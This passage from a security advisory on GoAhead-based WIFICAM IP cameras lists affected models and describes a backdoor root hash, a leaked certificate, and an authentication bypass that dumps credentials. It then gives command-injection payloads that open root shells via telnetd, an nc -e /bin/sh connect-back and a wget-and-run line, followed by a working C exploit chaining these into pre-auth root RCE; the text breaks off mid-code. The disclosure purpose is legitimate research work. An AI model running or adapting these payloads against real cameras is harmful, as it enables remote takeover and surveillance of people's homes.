+boh l
+bravo Other
+bush+plus BU-300WF
+ccam p2p
+china 8904W
+china HDIPCAM
+china IPCAM
+china Other
+china PTZCAM
+china np-02
+ciana+exports antani
+cina Other
+coolead L
+coolead L610WS
+dax Other
+denver IPC-320
+denver IPO-320
+e-landing 720p
+eScam QF100
+ebw Other
+epexis PIPCAMHD82
+epexis pipcam5
+esecure nvp
+geeya C602
+geeya P2P
+geeya c801
+hdcam Other
+homeguard 720P
+homeguard Other
+homeguard Wireless
+homeguard wifi
+iView ID002A
+iView Other
+insteon 75790
+insteon 75790wh
+insteon High
+insteon Other
+insteon Wireless
+iuk 5A1
+ivision hdwificam
+iwitness bullet
+jwt Other
+jyacam JYA8010
+kadymay KDM-6800
+kadymay KDM6702
+kadymay KMD-6800
+kadymay Other
+kang+xun xxc5030-t
+kines Other
+kiocong 1601
+kiocong 1602
+kiocong 1609
+kiocong Other
+kodak 201pl
+koicong 1601
+l+series CAM0758
+l+series CAM0760
+l+series Other
+l+series V100
+logan n8504hh
+meyetech 095475-caeca
+meyetech 188091-EFBAE
+meyetech Other
+meyetech WirelessCam
+micasaverde VistaCamSD
+pipcam HD17
+pni 941w
+pni IP451W
+pni IP541W
+pni IP941W
+pni IP951W
+pni Other
+pnp IP
+pnp Other
+semac Other
+skylink WC-300PS
+storex D-10H
+</code></pre>
+<p><a href="https://www.shodan.io/search?query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41">Shodan lists 185 000 vulnerable cameras</a>.</p>
+<p><a id="backdoor-account"></a></p>
+<h2>Details - Backdoor account</h2>
+<p>By default, telnetd is running on the camera.</p>
+<pre><code>user@kali$ telnet 192.168.1.107
+Trying 192.168.1.107...
+Connected to 192.168.1.107.
+Escape character is '^]'.
+
+apk-link login: admin
+Password:
+
+telnet&gt; q
+Connection closed.
+user@kali$
+</code></pre>
+<p>One backdoor account exists in the camera:</p>
+<pre><code>root:$1$ybdHbPDn$ii9aEIFNiolBbM9QxW9mr0:0:0::/root:/bin/sh
+</code></pre>
+<p><a id="rsa-lulz"></a></p>
+<h2>Details - RSA key and certificates</h2>
+<p>The <code>/system/www/pem/ck.pem</code> contains an Apple certificate with a private RSA key:</p>
+<pre><code>/ # cat /system/www/pem/ck.pem 
+Bag Attributes
+    friendlyName: Apple Production IOS Push Services: com.app.camera
+    localKeyID: 74 9E 29 D0 6A 47 1B 35 AD D4 68 6D 46 D8 E2 37 C8 DA A1 9D 
+subject=/UID=com.app.camera/CN=Apple Production IOS Push Services: com.app.camera/OU=SQ6NNPBE2K/C=US
+issuer=/C=US/O=Apple Inc./OU=Apple Worldwide Developer Relations/CN=Apple Worldwide Developer Relations Certification Authority
+-----BEGIN CERTIFICATE-----
+[...]
+-----END CERTIFICATE-----
+Bag Attributes
+    friendlyName: andrew
+    localKeyID: 74 9E 29 D0 6A 47 1B 35 AD D4 68 6D 46 D8 E2 37 C8 DA A1 9D 
+Key Attributes: &lt;No Attributes&gt;
+-----BEGIN RSA PRIVATE KEY-----
+[...]
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p><a id="pre-auth-info-leak-goahead"></a></p>
+<h2>Details - Pre-Auth Info Leak (credentials) within the custom http server</h2>
+<p>The HTTP interface is provided by a custom http server. This HTTP server is in fact based on GoAhead and
+was modified by the OEM vendor of the cameras (which resulted in the listed vulnerabilities).
+It allows 2 kinds of authentication:</p>
+<ul>
+<li>htdigest authentication OR</li>
+<li>authentication using credentials in URI (<code>?loginuse=LOGIN&amp;?loginpas=PASS</code>).</li>
+</ul>
+<p>By default, the web directory contains symbolic links to configuration files (<code>system.ini</code> and <code>system-b.ini</code> contain credentials):</p>
+<pre><code>/tmp/web # ls -la *ini
+lrwxrwxrwx    1 root     0               25 Oct 27 02:11 factory.ini -&gt; /system/param/factory.ini
+lrwxrwxrwx    1 root     0               30 Oct 27 02:11 factoryparam.ini -&gt; /system/param/factoryparam.ini
+lrwxrwxrwx    1 root     0               23 Oct 27 02:11 network-b.ini -&gt; /system/www/network.ini
+lrwxrwxrwx    1 root     0               23 Oct 27 02:11 network.ini -&gt; /system/www/network.ini
+lrwxrwxrwx    1 root     0               22 Oct 27 02:11 system-b.ini -&gt; /system/www/system.ini
+lrwxrwxrwx    1 root     0               22 Oct 27 02:11 system.ini -&gt; /system/www/system.ini
+/tmp/web #
+</code></pre>
+<p>With valid credentials, an attacker can retrieve the configuration, as shown below:</p>
+<pre><code>user@kali$ wget -qO- 'http://admin:admin@192.168.1.107/system.ini'|xxd
+
+[...]
+000001d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
+000001e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
+000001f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
+00000200: ffff ffff ffff ffff ffff ffff ffff ffff  ................
+00000210: ffff ffff ffff ffff ffff ffff 7b6f 1158  ............{o.X
+00000220: 0000 0000 0100 0000 7469 6d65 2e6e 6973  ........time.nis
+00000230: 742e 676f 7600 0000 0000 0000 0000 0000  t.gov...........
+00000240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000280: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000290: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000002a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000002b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000002c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+[...]
+00000640: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000680: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
+000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
+000006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000006d0: 030a 0a0f 8000 0000 0101 0003 0002 0000  ................
+[...]
+user@kali$
+</code></pre>
+<p>To browse <code>.cgi</code> files, an attacker needs to authenticate too:</p>
+<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/get_params.cgi?loginuse=BAD_LOGIN&amp;loginpas=BAD_PASS'
+var result="Auth Failed";
+user@kali$ wget -qO- 'http://192.168.1.107/get_params.cgi?loginuse&amp;loginpas'
+var result="Auth Failed";
+</code></pre>
+<p>But it appears access to <code>.ini</code> files are not correctly checked. The attacker can bypass the authentication
+by providing an empty <code>loginuse</code> and an empty <code>loginpas</code> in the URI:</p>
+<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/system.ini?loginuse&amp;loginpas'|xxd|less
+00000000: 5749 4649 4341 4d00 0000 0000 0000 0000  WIFICAM.........
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000020: 0000 0100 0000 0000 0000 0000 0000 0000  ................
+[...]
+00000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
+000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
+[...]
+</code></pre>
+<p>A PoC is provided:</p>
+<pre><code>./expl 192.168.1.107 --get-config | xxd | grep 000003
+
+00000030: 6d53 6563 0a0a 5b2b 5d20 6279 7061 7373  mSec..[+] bypass
+00000300: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000310: 0000 0000 0000 0000 0000 0000 0a0a 0a0a  ................
+00000320: 0100 0000 0a03 0100 0000 0000 0000 0000  ................
+00000330: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000350: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000360: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000370: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000380: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000390: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000003a0: 0000 0000 0000 0000 0000 6164 6d69 6e00  ..........admin.
+000003b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000003c0: 0000 0000 0000 0000 0000 6164 6d69 6e00  ..........admin.
+000003d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000003e0: 0000 0000 0000 0000 0000 030a 0a0f 8000  ................
+000003f0: 0000 0101 0003 0002 0000 0080 8080 8001  ................
+</code></pre>
+<p>This vulnerability allows an attacker to steal credentials, ftp accounts and smtp accounts (email).</p>
+<p><a id="root-rce"></a></p>
+<h2>Details - Authenticated RCE as root</h2>
+<p>A RCE exists in the ftp configuration CGI. This is well-documented as shown <a href="https://jumpespjump.blogspot.de/2015/09/how-i-hacked-my-ip-camera-and-found.html">here</a> and <a href="https://www.pentestpartners.com/blog/hacking-the-aldi-ip-cctv-camera-part-2/">here</a> in several different camera models.</p>
+<p>The partition <code>/</code> is mounted in Read-Only, so modifications are not possible in this partition.</p>
+<p>The command injection is located in in <code>set_ftp.cgi</code> (see <code>$(ftp x.com)</code>):</p>
+<pre><code>http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=admin&amp;loginpas=admin&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(ftp x.com)ftp&amp;dir=/&amp;mode=PORT&amp;upload_interval=0
+http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=admin&amp;loginpas=admin
+</code></pre>
+<p>When doing a tcpdump, we can see the DNS resolution for x.com:</p>
+<pre><code>00:00:00.151107 IP 192.168.1.107.33551 &gt; 8.8.8.8.53: 40888+ A? x.com. (23)
+</code></pre>
+<p>so, <code>ftp x.com</code> is executed.</p>
+<p>We can use the telnetd binary to start an authenticated-less telnetd access:</p>
+<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=admin&amp;loginpas=admin&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(telnetd -p25 -l/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0'
+user@kali$ wget -qO- 'http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=admin&amp;loginpas=admin'
+</code></pre>
+<p>Testing this will give us root account on port 25/tcp:</p>
+<pre><code>user@kali$ telnet 192.168.1.107 25
+Trying 192.168.1.107...
+Connected to 192.168.1.107.
+Escape character is '^]'.
+
+/ # id
+uid=0(root) gid=0
+/ # uname -ap
+Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux
+/ # mount
+rootfs on / type rootfs (rw)
+/dev/root on / type squashfs (ro,relatime)
+/proc on /proc type proc (rw,relatime)
+sysfs on /sys type sysfs (rw,relatime)
+tmpfs on /dev type tmpfs (rw,relatime,size=2048k)
+tmpfs on /tmp type tmpfs (rw,relatime,size=5120k)
+devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
+/dev/mtdblock3 on /system type jffs2 (rw,relatime)
+/ #
+</code></pre>
+<p><code>/etc</code> is in read-only. So, command injection must not write into <code>/etc</code>. The injection is located in <code>/tmp/ftpupload.sh</code>:</p>
+<pre><code>/ # cat /tmp/ftpupload.sh 
+/bin/ftp -n&lt;&lt;!
+open 192.168.1.1 21
+user ftp $(telnetd -l /bin/sh -p 25)ftp
+binary
+lcd /tmp
+put ftptest.txt
+close
+bye
+!
+/ #
+</code></pre>
+<p><a id="pre-auth-root-rce"></a></p>
+<h2>Details - Pre-Auth RCE as root</h2>
+<p>By combining the Pre-Auth Info Leak within the custom http server vulnerability and then authenticated RCE as root, an attacker can achieve a pre-auth RCE as root on a LAN or on the Internet.</p>
+<p>An exploit is provided and can be used to get a root RCE with connect-back.</p>
+<p>The exploit will:</p>
+<ol>
+<li>extract the valid credentials by connecting to the remote custom HTTP server of the targeted camera</li>
+<li>plant a connect-back with <code>nc</code></li>
+<li>execute the payload</li>
+<li>the attacker will receive a root shell with netcat on a second terminal</li>
+<li>clean the payload located in the configuration file</li>
+</ol>
+<p>It affects 1250+ camera models.</p>
+<p>Demo:</p>
+<pre><code>user@kali$ gcc -Wall -o expl expl-goahead-camera.c &amp;&amp; ./expl 192.168.1.107                               
+Camera 0day root RCE with connect-back @PierreKimSec
+
+Please run `nc -vlp 1337` on 192.168.1.1
+
+[+] bypassing auth ... done
+    login = admin
+    pass  = admin
+[+] planting payload ... done
+[+] executing payload ... done
+[+] cleaning payload ... done
+[+] cleaning payload ... done
+[+] enjoy your root shell on 192.168.1.1:1337
+user@kali$
+</code></pre>
+<p>On the second xterm:</p>
+<pre><code>user@kali$ nc -lvp 1337
+listening on [any] 1337 ...
+192.168.1.107: inverse host lookup failed: Unknown host
+connect to [192.168.1.1] from (UNKNOWN) [192.168.1.107] 47968
+id
+uid=0(root) gid=0
+uname -ap
+Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux
+ps  
+PID   USER     TIME   COMMAND
+    1 root       0:01 {linuxrc} init
+    2 root       0:00 [kthreadd]
+    3 root       0:00 [ksoftirqd/0]
+    5 root       0:00 [kworker/0:0H]
+    6 root       0:00 [kworker/u2:0]
+    7 root       0:00 [rcu_preempt]
+    8 root       0:00 [rcu_bh]
+    9 root       0:00 [rcu_sched]
+   10 root       0:00 [watchdog/0]
+   11 root       0:00 [khelper]
+   12 root       0:00 [writeback]
+   13 root       0:00 [bioset]
+   14 root       0:00 [kblockd]
+   15 root       0:00 [khubd]
+   16 root       0:00 [kworker/0:1]
+   17 root       0:00 [cfg80211]
+   18 root       0:00 [rpciod]
+   19 root       0:00 [kswapd0]
+   20 root       0:00 [fsnotify_mark]
+   21 root       0:00 [nfsiod]
+   22 root       0:00 [crypto]
+   36 root       0:00 [kworker/u2:1]
+   39 root       0:00 [i2s_work_1]
+   40 root       0:00 [i2s_codec_irq_w]
+   41 root       0:00 [kworker/0:2]
+   42 root       0:00 [deferwq]
+   43 root       0:00 [kworker/0:1H]
+   59 root       0:00 [jffs2_gcd_mtd3]
+   61 root       0:00 telnetd
+   69 root       0:00 /system/system/bin/wifidaemon
+   70 root       0:00 /sbin/getty -L ttyS1 115200 vt100
+   98 root       0:01 [RtmpTimerTask]
+   99 root       0:00 [RtmpMlmeTask]
+  100 root       0:00 [RtmpCmdQTask]
+  101 root       0:00 [RtmpWscTask]
+  148 root       1:19 /tmp/encoder
+  164 root       0:00 [irq/37-isp]
+  236 root       0:07 [apical_isp_fw_p]
+ 2330 root       0:00 sh -c /tmp/ftpupload.sh &gt; /tmp/ftpret.txt
+ 2331 root       0:00 {exe} ash /tmp/ftpupload.sh
+ 2332 root       0:00 {exe} ash /tmp/ftpupload.sh
+ 2333 root       0:00 /bin/ftp -n
+ 2334 root       0:00 /bin/sh
+ 2439 root       0:00 ps
+</code></pre>
+<p>A working exploit is provided:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> 
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;string.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;unistd.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;arpa/inet.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;netinet/in.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/types.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/socket.h&gt;</span><span style="color: #BC7A00"></span>
+
+<span style="color: #BC7A00">#define CAM_PORT 80</span>
+<span style="color: #BC7A00">#define REMOTE_HOST &quot;192.168.1.1&quot;</span>
+<span style="color: #BC7A00">#define REMOTE_PORT &quot;1337&quot;</span>
+<span style="color: #BC7A00">#define PAYLOAD_0 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(nc%20&quot; REMOTE_HOST &quot;+&quot; REMOTE_PORT &quot;%20-e/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
+<span style="color: #BC7A00">#define PAYLOAD_1 &quot;GET /ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=%s&amp;loginpas=%s\r\n\r\n&quot;</span>
+<span style="color: #BC7A00">#define PAYLOAD_2 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=passpasspasspasspasspasspasspasspass&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
+
+
+<span style="color: #BC7A00">#define ALTERNATIVE_PAYLOAD_zero0 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(nc+&quot; REMOTE_HOST &quot;+&quot; REMOTE_PORT &quot;+-e/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
+<span style="color: #BC7A00">#define ALTERNATIVE_PAYLOAD_zero1 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(wget+http:</span><span style="color: #408080; font-style: italic">//&quot; REMOTE_HOST &quot;/stufz&amp;&amp;./stuff)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
+
+<span style="color: #B00040">char</span> <span style="color: #666666">*</span>    <span style="color: #0000FF">creds</span>(<span style="color: #B00040">char</span>  <span style="color: #666666">*</span>argv,
+                <span style="color: #B00040">int</span>   get_config);
+
+<span style="color: #B00040">int</span>       <span style="color: #0000FF">rce</span>(<span style="color: #B00040">char</span>    <span style="color: #666666">*</span>argv,
+              <span style="color: #B00040">char</span>    <span style="color: #666666">*</span>id,
+              <span style="color: #B00040">char</span>    attack[],
+              <span style="color: #B00040">char</span>    desc[]);
+
+
+<span style="color: #B00040">int</span>   <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>        argc,
+           <span style="color: #B00040">char</span>       <span style="color: #666666">**</span>argv,
+           <span style="color: #B00040">char</span>       <span style="color: #666666">**</span>envp)
+{
+  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>id;
+
+  printf(<span style="color: #BA2121">&quot;Camera 0day root RCE with connect-back @PierreKimSec</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span>);
+
+  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
+  {
+     printf(<span style="color: #BA2121">&quot;%s target</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, argv[<span style="color: #666666">0</span>]);
+     printf(<span style="color: #BA2121">&quot;%s target --get-config      will dump the configuration and exit</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, argv[<span style="color: #666666">0</span>]);
+     <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">==</span> <span style="color: #666666">2</span>)
+    printf(<span style="color: #BA2121">&quot;Please run `nc -vlp %s` on %s</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span>, REMOTE_PORT, REMOTE_HOST);
+
+  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">==</span> <span style="color: #666666">3</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #666666">!</span>strcmp(argv[<span style="color: #666666">2</span>], <span style="color: #BA2121">&quot;--get-config&quot;</span>))
+    id <span style="color: #666666">=</span> creds(argv[<span style="color: #666666">1</span>], <span style="color: #666666">1</span>);
+  <span style="color: #008000; font-weight: bold">else</span>
+    id <span style="color: #666666">=</span> creds(argv[<span style="color: #666666">1</span>], <span style="color: #666666">0</span>);
+
+  <span style="color: #008000; font-weight: bold">if</span> (id <span style="color: #666666">==</span> <span style="color: #008000">NULL</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;exploit failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+  printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+
+  printf(<span style="color: #BA2121">&quot;    login = %s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, id);
+  printf(<span style="color: #BA2121">&quot;    pass  = %s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, id <span style="color: #666666">+</span> <span style="color: #666666">32</span>);
+
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_0, <span style="color: #BA2121">&quot;planting&quot;</span>))
+    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+  sleep(<span style="color: #666666">1</span>);
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_1, <span style="color: #BA2121">&quot;executing&quot;</span>))
+    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_2, <span style="color: #BA2121">&quot;cleaning&quot;</span>))
+    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_1, <span style="color: #BA2121">&quot;cleaning&quot;</span>))
+    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+
+  printf(<span style="color: #BA2121">&quot;[+] enjoy your root shell on %s:%s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, REMOTE_HOST, REMOTE_PORT);
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
+}
+
+
+<span style="color: #B00040">char</span> <span style="color: #666666">*</span>    <span style="color: #0000FF">creds</span>(<span style="color: #B00040">char</span>  <span style="color: #666666">*</span>argv,
+                <span style="color: #B00040">int</span>   get_config)
+{
+  <span style="color: #B00040">int</span>                 sock;
+  <span style="color: #B00040">int</span>                 n;
+  <span style="color: #008000; font-weight: bold">struct</span> sockaddr_in  serv_addr;
+  <span style="color: #B00040">char</span>                buf[<span style="color: #666666">8192</span>] <span style="color: #666666">=</span> { <span style="color: #666666">0</span> };
+  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>out;
+  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>tmp;
+  <span style="color: #B00040">char</span>                payload[] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;GET /system.ini?loginuse&amp;loginpas HTTP/1.0</span><span style="color: #BB6622; font-weight: bold">\r\n\r\n</span><span style="color: #BA2121">&quot;</span>;
+  <span style="color: #B00040">int</span>                 old_n;
+  <span style="color: #B00040">int</span>                 n_total;
+
+
+  sock <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+  n <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+  old_n <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+  n_total <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+
+  printf(<span style="color: #BA2121">&quot;[+] bypassing auth ... &quot;</span>);
+
+  <span style="color: #008000; font-weight: bold">if</span> ((sock <span style="color: #666666">=</span> socket(AF_INET, SOCK_STREAM, <span style="color: #666666">0</span>)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;Error while creating socket</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+  }
+
+  memset(<span style="color: #666666">&amp;</span>serv_addr, <span style="color: #BA2121">&#39;0&#39;</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr));
+  serv_addr.sin_family <span style="color: #666666">=</span> AF_INET;
+  serv_addr.sin_port <span style="color: #666666">=</span> htons(CAM_PORT);
+
+  <span style="color: #008000; font-weight: bold">if</span> (inet_pton(AF_INET, argv, <span style="color: #666666">&amp;</span>serv_addr.sin_addr) <span style="color: #666666">&lt;=</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;Error while inet_pton</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">if</span> (connect(sock, (<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>)<span style="color: #666666">&amp;</span>serv_addr , <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;creds: connect failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">if</span> (send(sock, payload, strlen(payload) , <span style="color: #666666">0</span>) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;creds: send failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(tmp <span style="color: #666666">=</span> malloc(<span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span> <span style="color: #666666">*</span> <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(out <span style="color: #666666">=</span> calloc(<span style="color: #666666">64</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+
+  <span style="color: #008000; font-weight: bold">while</span> ((n <span style="color: #666666">=</span> recv(sock, buf, <span style="color: #008000; font-weight: bold">sizeof</span>(buf), <span style="color: #666666">0</span>)) <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>)
+  {
+    n_total <span style="color: #666666">+=</span> n;
+    <span style="color: #008000; font-weight: bold">if</span> (n_total <span style="color: #666666">&lt;</span> <span style="color: #666666">1024</span> <span style="color: #666666">*</span> <span style="color: #666666">10</span>)
+      memcpy(tmp <span style="color: #666666">+</span> old_n, buf, n);
+    <span style="color: #008000; font-weight: bold">if</span> (n <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span>)
+      old_n <span style="color: #666666">=</span> n;
+  }
+
+  close(sock);
+
+  <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">  [ HTTP HEADERS ]</span>
+<span style="color: #408080; font-style: italic">  ...</span>
+
+<span style="color: #408080; font-style: italic">  000????: 0000 0a0a 0a0a 01.. .... .... .... ....</span>
+<span style="color: #408080; font-style: italic">                ^^^^ ^^^^ ^^</span>
+<span style="color: #408080; font-style: italic">                Useful reference in the binary data</span>
+<span style="color: #408080; font-style: italic">                in order to to find the positions of</span>
+<span style="color: #408080; font-style: italic">                credentials</span>
+<span style="color: #408080; font-style: italic">  ...</span>
+<span style="color: #408080; font-style: italic">  ... </span>
+<span style="color: #408080; font-style: italic">  0000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........</span>
+<span style="color: #408080; font-style: italic">  00006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span>
+<span style="color: #408080; font-style: italic">  00006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........</span>
